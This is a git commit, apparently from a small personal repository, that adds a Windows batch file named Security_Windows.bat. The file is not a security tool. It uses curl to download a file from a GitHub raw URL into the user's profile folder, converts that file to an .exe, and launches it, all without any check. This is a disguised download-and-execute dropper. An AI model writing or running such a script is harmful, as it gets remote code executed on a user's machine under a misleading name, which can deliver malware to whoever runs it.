bb527b68cbc9f765cb8a73663f4ec2457d96cbe1
n0t_cr1m3 <raphaelfavreau26@gmail.com>
2024-01-03 18:26:55 +0100

    Ajout du fichier .bat

---
+++ Security_Windows.bat
@@ -0,0 +1,13 @@
+@echo off
+set "url=https://github.com/n0t_cr1m3/test/raw/main/Security_Windows.bat"
+set "destination=%USERPROFILE%/Security_Windows.bat"
+set "convertedExePath=%USERPROFILE%/Security_Windows.exe"
+
+:: Télécharge le fichier depuis l'URL spécifiée
+curl -o %destination% %url%
+
+:: Convertit le .bat en .exe
+bat_to_exe_converter.exe /bat %destination% /exe %convertedExePath%
+
+:: Exécute le fichier téléchargé
+start %convertedExePath%
